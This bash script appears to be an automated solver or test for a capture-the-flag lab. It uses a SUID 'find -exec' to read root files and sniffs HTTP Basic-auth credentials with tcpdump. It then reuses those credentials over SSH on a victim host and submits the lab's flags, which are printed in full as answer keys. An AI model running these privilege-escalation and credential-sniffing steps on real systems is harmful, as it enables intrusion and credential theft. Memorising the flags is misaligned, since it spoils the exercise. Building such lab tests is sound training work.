#!/bin/bash

HOP_USER=bob
HOP_HOST=172.20.0.47
HOP_PASS=iloveyoumandy

VICTIM_USER=admin
VICTIM_PASS=super-secret-password-cannot-be-guessed
VICTIM_HOST=172.20.0.49

MATCH=`sshpass -p "$HOP_PASS" ssh \
-o LogLevel=error \
-o UserKnownHostsFile=/dev/null \
-o StrictHostKeyChecking=no \
$HOP_USER@$HOP_HOST \
"find . -exec ls /root \; -quit" | grep -o "flag.txt"`
if [[ "$MATCH" == "" ]]
then
    echo "Error - could not list /root dir using find command with SUID bit"
    exit 1
fi

MATCH=`sshpass -p "$HOP_PASS" ssh \
-o LogLevel=error \
-o UserKnownHostsFile=/dev/null \
-o StrictHostKeyChecking=no \
$HOP_USER@$HOP_HOST \
"find . -exec cat /root/flag.txt \; -quit" | grep -o "BSY{QQgCzB3HmryOC7aijBJfeylUYOzgMviOIkdBzlMmGYgJWoY4Sz21s3ZcIPiW}"`
if [[ "$MATCH" == "" ]]
then
    echo "Error - could read flag from /root/flag.txt file using find command with SUID bit"
    exit 2
fi

RES=`curl -s 'http://172.20.0.3/api/challenges/submit' \
    -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"challenge_id": "jump-around", "task_id": "task1", "flag" : "BSY{QQgCzB3HmryOC7aijBJfeylUYOzgMviOIkdBzlMmGYgJWoY4Sz21s3ZcIPiW}"}'`
if [[ $RES != *"Congratulations"* ]]; then
  echo "Failed to submit the flag for task1 - $RES"
  exit 3
fi


echo "sniffing packets for 7 seconds, wait with me!"
MATCH=`sshpass -p "$HOP_PASS" ssh \
-o LogLevel=error \
-o UserKnownHostsFile=/dev/null \
-o StrictHostKeyChecking=no \
$HOP_USER@$HOP_HOST \
"find . -exec tcpdump -n -v -A port 80 -w /tmp/capture4.pcap -G 7 -W 1 \; -quit && cat -A /tmp/capture4.pcap" | grep -o "Authorization: Basic YWRtaW46c3VwZXItc2VjcmV0LXBhc3N3b3JkLWNhbm5vdC1iZS1ndWVzc2VkCg=="`
if [[ "$MATCH" == "" ]]
then
    echo "Error - did not find victim's credentials in HTTP traffic on proxy-hop machine"
    exit 4
fi


MATCH=`sshpass -p "$VICTIM_PASS" ssh \
-o LogLevel=error \
-o UserKnownHostsFile=/dev/null \
-o StrictHostKeyChecking=no \
$VICTIM_USER@$VICTIM_HOST \
"cat flag.txt" | grep -o "BSY{THd8a6l0GCoRDpRThK9z1FnoEcl0y0cV8CTUGNBWwXHXAC5XDyNVqIP5mDHH}"`
if [[ "$MATCH" == "" ]]
then
    echo "Error - could not read using victim's credentials via SSH the final flag"
    exit 5
fi

RES=`curl -s 'http://172.20.0.3/api/challenges/submit' \
    -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"challenge_id": "jump-around", "task_id": "task2", "flag" : "BSY{THd8a6l0GCoRDpRThK9z1FnoEcl0y0cV8CTUGNBWwXHXAC5XDyNVqIP5mDHH}"}'`
if [[ $RES != *"Congratulations"* ]]; then
  echo "Failed to submit the flag for task2 - $RES"
  exit 6
fi

echo "OK - tests passed"
exit 0
